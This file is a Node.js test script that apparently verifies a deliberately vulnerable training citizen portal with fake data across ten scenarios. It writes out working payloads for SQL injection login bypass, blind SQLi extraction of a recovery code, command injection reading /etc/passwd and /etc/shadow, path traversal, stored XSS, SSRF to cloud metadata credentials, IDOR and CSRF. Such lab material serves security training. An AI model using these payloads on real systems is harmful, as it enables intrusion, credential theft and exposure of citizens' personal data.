import assert from 'node:assert/strict'

const base = process.env.LAB_URL || 'http://127.0.0.1:11191'
const basicAuth = process.env.LAB_BASIC_AUTH
const authorization = basicAuth ? `Basic ${Buffer.from(basicAuth).toString('base64')}` : ''
const call = async (path, cookie = '', init = {}) => {
  const response = await fetch(base + path, { ...init, headers: { ...(init.headers || {}), ...(authorization ? { authorization } : {}), ...(cookie ? { cookie } : {}) } })
  const body = await response.text()
  return { response, body, json: () => JSON.parse(body) }
}
const login = async (username, password) => {
  const result = await call('/api/citizens/login', '', {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ username, password }),
  })
  assert.equal(result.response.status, 200, result.body)
  return { cookie: result.response.headers.get('set-cookie').split(';')[0], user: result.json().user }
}

const normal = await login('hangaram', 'hangaram')
assert.equal((await call('/api/admin/overview', normal.cookie)).response.status, 403)
const dajeongLogin = await login('dajeong', 'dajeong')
assert.equal(dajeongLogin.user.username, 'dajeong')
const adminLogin = await login('admin', 'admin')
assert.equal(adminLogin.user.role, 'staff')

// S01-A: classic authentication bypass.
const bypass = await login("' OR 1=1 --", 'wrong')
assert.equal(bypass.user.username, 'admin')
assert.equal(bypass.user.role, 'staff')
assert.equal((await call('/api/admin/overview', bypass.cookie)).response.status, 200)

// S01-B / KISA IL: the public registration check can enumerate valid usernames.
const accountCandidates = ['admin', 'hangaram', 'dajeong', 'guest', 'teacher']
const enumeratedAccounts = Object.fromEntries(await Promise.all(accountCandidates.map(async (username) => {
  const result = await call('/api/public/account-check?username=' + encodeURIComponent(username))
  assert.equal(result.response.status, 200, result.body)
  return [username, result.json().registered]
})))
assert.deepEqual(enumeratedAccounts, {
  admin: true,
  hangaram: true,
  dajeong: true,
  guest: false,
  teacher: false,
})

// S01-C: infer the complete recovery code one character at a time through the Boolean oracle.
const blindAlphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-'
let inferredRecoveryCode = ''
for (let position = 1; position <= 16; position += 1) {
  let matched = false
  for (const guessedCharacter of blindAlphabet) {
    const payload = `admin' AND substr((SELECT recovery_code FROM portal_accounts WHERE username='admin'),${position},1)='${guessedCharacter}' --`
    const result = await call('/api/public/account-check?username=' + encodeURIComponent(payload))
    assert.equal(result.response.status, 200, result.body)
    if (result.json().registered) {
      inferredRecoveryCode += guessedCharacter
      matched = true
      break
    }
  }
  if (!matched) break
}
assert.equal(inferredRecoveryCode, 'NURI-7342')

// S02 / KISA CI: a normal GET is the negative-control baseline, then GET and POST
// parameter manipulation reach the isolated command sandbox.
const normalStatus = await call('/api/service/status/check?target=portal.internal', normal.cookie)
assert.equal(normalStatus.response.status, 200, normalStatus.body)
assert.equal(normalStatus.json().serviceAvailable, true)
assert.doesNotMatch(normalStatus.json().output, /root:|내부 서비스 점검 메모/)

const blockedShadow = await call('/api/service/status/check?target=' + encodeURIComponent('portal.internal; cat /etc/shadow'), normal.cookie)
assert.equal(blockedShadow.response.status, 400)
assert.match(blockedShadow.json().output, /Permission denied/)

const commandPasswd = await call('/api/service/status/check?target=' + encodeURIComponent('portal.internal; cat /etc/passwd'), normal.cookie)
assert.equal(commandPasswd.response.status, 200, commandPasswd.body)
assert.match(commandPasswd.json().output, /node:x:/)

const commandPayloads = [
  'portal.internal; cat config/service.txt',
  'portal.internal && cat config/service.txt',
  'portal.internal | cat config/service.txt',
  'portal.internal"$(cat config/service.txt)"',
]
const commandResults = []
for (const payload of commandPayloads) {
  const result = await call('/api/service/status/check?target=' + encodeURIComponent(payload), normal.cookie)
  assert.equal(result.response.status, 200, result.body)
  assert.match(result.json().output, /내부 서비스 점검 메모/)
  commandResults.push(result)
}
const postCommand = await call('/api/service/status/check', normal.cookie, {
  method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ target: 'portal.internal; cat simulated-server/var/lib/sejong/citizens.csv' }),
})
assert.equal(postCommand.response.status, 200, postCommand.body)
assert.match(postCommand.json().output, /TRAINING_FAKE_DATA/)
assert.match(postCommand.json().output, /dajeong@example\.invalid/)

// S03: a wrong random-looking code fails, while the client-controlled complete step bypasses it.
const wrongVerify = await call('/api/citizens/identity/complete', normal.cookie, {
  method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ verificationStep: 'verify', code: '00000000' }),
})
assert.equal(wrongVerify.response.status, 400)
const normalVerify = await call('/api/citizens/identity/complete', dajeongLogin.cookie, {
  method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ verificationStep: 'verify', code: '12345678' }),
})
assert.equal(normalVerify.json().verified, true)
const verify = await call('/api/citizens/identity/complete', normal.cookie, {
  method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ verificationStep: 'complete' }),
})
assert.equal(verify.json().verified, true)
assert.equal((await call('/api/citizens/identity/status', normal.cookie)).json().verified, true)

// S04: sequential IDs expose several other citizens' applications.
const other = await call('/api/applications?receiptNo=APP-1000', normal.cookie)
assert.equal(other.json().application.owner_username, 'dajeong')
assert.equal(other.json().application.applicant_phone, '010-0000-2026')
assert.equal(other.json().application.applicant_email, 'dajeong@example.invalid')
assert.match(other.json().application.applicant_address, /다정동/)
const otherLater = await call('/api/applications?receiptNo=APP-1013', normal.cookie)
assert.equal(otherLater.json().application.owner_username, 'dajeong')
assert.match(otherLater.body, /비공개/)

// S05: traversal stays in the simulated file lab but reaches several non-public paths.
const passwd = await call('/api/documents/download?file=' + encodeURIComponent('../../../etc/passwd'), normal.cookie)
assert.match(passwd.body, /root:x:0:0/)
const privateDoc = await call('/api/documents/download?file=' + encodeURIComponent('../../../var/private/operations.txt'), normal.cookie)
assert.match(privateDoc.body, /세종누리 내부 업무 참고/)
const accessLog = await call('/api/documents/download?file=' + encodeURIComponent('../../../var/log/portal/access.log'), normal.cookie)
assert.match(accessLog.body, /POST \/api\/citizens\/login 401/)

// S06: active HTML is stored and served from the application origin.
const data = new FormData()
data.append('attachment', new Blob(['<!doctype html><script>document.title="upload-executed"</script>'], { type: 'text/html' }), 'evidence.html')
const upload = await call('/api/attachments', normal.cookie, { method: 'POST', body: data })
assert.equal(upload.response.status, 201)
assert.match((await call(upload.json().publicUrl, normal.cookie)).body, /upload-executed/)

// S07: internal service discovery and a simulated cloud metadata chain.
const operations = await call('/api/documents/preview?url=' + encodeURIComponent('http://metadata.internal/operations'), normal.cookie)
assert.match(operations.json().body, /내부 운영 메모/)
const networkMap = await call('/api/documents/preview?url=' + encodeURIComponent('http://metadata.internal/network'), normal.cookie)
assert.match(networkMap.json().body, /citizen-db\.internal:5432/)
const metadataIndex = await call('/api/documents/preview?url=' + encodeURIComponent('http://169.254.169.254/latest/meta-data/'), normal.cookie)
assert.match(metadataIndex.json().body, /iam\/security-credentials/)
const role = await call('/api/documents/preview?url=' + encodeURIComponent('http://169.254.169.254/latest/meta-data/iam/security-credentials/'), normal.cookie)
assert.match(role.json().body, /SejongNuriTrainingRole/)
const fakeCredentials = await call('/api/documents/preview?url=' + encodeURIComponent('http://169.254.169.254/latest/meta-data/iam/security-credentials/SejongNuriTrainingRole'), normal.cookie)
assert.match(fakeCredentials.json().body, /TRAINING_ONLY_ACCESS_KEY/)

// S08: stored markup is returned unchanged for the vulnerable renderer.
const post = await call('/api/board/posts', normal.cookie, {
  method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ content: '<img src=x onerror="document.title=\'board-executed\'">' }),
})
assert.equal(post.response.status, 201)
assert.match((await call('/api/board/posts')).body, /board-executed/)

// S09: a GET request changes state without a CSRF token.
const preference = await call('/api/citizens/preferences/email?enabled=false', normal.cookie)
assert.equal(preference.json().emailEnabled, false)
assert.equal((await call('/api/citizens/preferences', normal.cookie)).json().emailEnabled, false)

// S10: a pending certificate is blocked in the UI but the direct endpoint still issues a real attachment.
const certificates = await call('/api/certificates', normal.cookie)
assert.equal(certificates.json().certificates.find((item) => item.id === 7001).status, '승인 대기')
const document = await call('/api/certificates/7001/download', normal.cookie)
assert.match(document.response.headers.get('content-disposition') || '', /attachment/)
assert.match(document.response.headers.get('content-type') || '', /text\/html/)
assert.match(document.body, /주거환경 지원 확인서/)
assert.match(document.body, /승인 대기/)
assert.match(document.body, /승인되지 않은 신청 건/)

for (const result of [normalStatus, commandPasswd, ...commandResults, postCommand, verify, other, passwd, privateDoc, upload, operations, networkMap, metadataIndex, fakeCredentials, post, preference, document]) {
  assert.doesNotMatch(result.body, /FLAG\{/)
}
console.log('통합 시민포털 S01–S10 동작 확인 완료 (문자 단위 Blind SQLi·Network형 GET·POST 명령실행·가상 개인정보 영향·KISA 분류 흐름 포함)')
